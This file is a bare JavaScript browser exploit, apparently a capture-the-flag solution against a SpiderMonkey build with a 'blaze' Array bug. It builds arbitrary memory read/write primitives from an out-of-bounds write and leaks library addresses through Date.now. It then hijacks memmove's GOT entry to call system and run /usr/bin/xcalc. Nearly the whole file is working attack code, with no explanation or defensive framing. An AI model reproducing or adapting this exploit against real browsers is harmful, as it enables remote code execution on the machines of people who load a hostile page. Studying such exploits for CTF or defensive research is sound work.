function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function Int64(v) {
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };


    this.bytes = function() {
        return Array.from(bytes);
    };

    this.byteAt = function(i) {
        return bytes[i];
    };

    this.lower = function() {
        return bytes[0] + 256 * bytes[1] + 256*256*bytes[2] + 256*256*256*bytes[3];
    };

    this.upper = function() {
        return bytes[4] + 256 * bytes[5] + 256*256*bytes[6] + 256*256*256*bytes[7];
    };

    this.toInt = function() {
        return this.upper() * 2**32 + this.lower();
    }

    this.rshift = function() {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = bytes[i];
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
    }

    this.lshift = function() {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = bytes[i];
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
    }

}


function log(x, doc = false) {
    if (typeof document !== "undefined" && doc) {
        document.write(x + " ");
    }
    console.log(x);
}



var blaze_Array = new Array(1);
blaze_Array[0] = 0x41414141;

ab = new ArrayBuffer(32);
overwrite_len = new Uint32Array(ab);
overwrite_len[0] = 0x77777777;

victim_ab = new ArrayBuffer(32);
victim = new Uint32Array(victim_ab);
victim[0] = 0x88888888;

blaze_Array.blaze();

function print(msg){
	console.log(msg);
}

for(var i = 0; i <= 20; i++){
	if(blaze_Array[i] == 8){
		print(i)
		break
	}
}

blaze_Array[i] = 0x1000;

var ptr_overwrite_idx = -1;

for(var i = 0; i < 1000; i++){
	if (overwrite_len[i] == 0x88888888){
		overwrite_len[i] = 0x98888888;
		ptr_overwrite_idx = i;
	}
}

memory = {
            prepare: function(addr, typed_array) {
                x = new Int64(addr);
                x.rshift();
                overwrite_len[ptr_overwrite_idx - 8] = x.lower();
                overwrite_len[ptr_overwrite_idx - 7] = x.upper();
                return new typed_array(victim_ab);
            },

            write: function(addr, data) {
                view = memory.prepare(addr, Uint32Array);
                x = new Int64(data)
                view[0] = x.lower();
                view[1] = x.upper();
            },

            read: function(addr) {
                view = memory.prepare(addr, Uint32Array);
                return new Int64(view[0] + 256 ** 4 * view[1]);
            },

            readWithTag: function(addr) {
                view = memory.prepare(addr, Uint32Array);
                return new Int64(view[0] + 256 ** 4 * (view[1] & 0xffff));
            }
        }


function leak_native(nat_func) {
            victim_ab.yolo = nat_func;
            victim_ab.haha = 0x98888888;
            slots = overwrite_len[ptr_overwrite_idx - 13] * 2 ** 32 + overwrite_len[ptr_overwrite_idx - 12];
            slots_0 = (memory.readWithTag(slots).toInt());

            return memory.read(slots_0 + 5 * 8).toInt()
        }

nat_func = leak_native(Date.now);
log("[+] Date.now @ " + nat_func.toString(16) + "\n");

xul_base = nat_func - 0x49c7ab0;
memmove_got = xul_base + 0x0000818b220;
dup_got = xul_base + 0x0000818b738;

dup_libc = memory.read(dup_got);
libc_base = dup_libc - 0x110970;
system_libc = libc_base + 0x4f440;

log("[+] xul base @ " + xul_base.toString(16), true);
log("[+] memmove@got @ " + memmove_got.toString(16), true);
log("[+] libc_base@libc_@_" + libc_base.toString(16), true);
log("[+] system@libc @ " + system_libc.toString(16), true);

var target = new Uint8Array(100);
var cmd = "/usr/bin/xcalc"

for (var i = 0; i < cmd.length; i++) {
            target[i] = cmd.charCodeAt(i);
        }

target[cmd.length] = 0;

memmove_backup = memory.read(memmove_got);

memory.write(memmove_got, system_libc);
target.copyWithin(0, 1);
memory.write(memmove_got, memmove_backup);
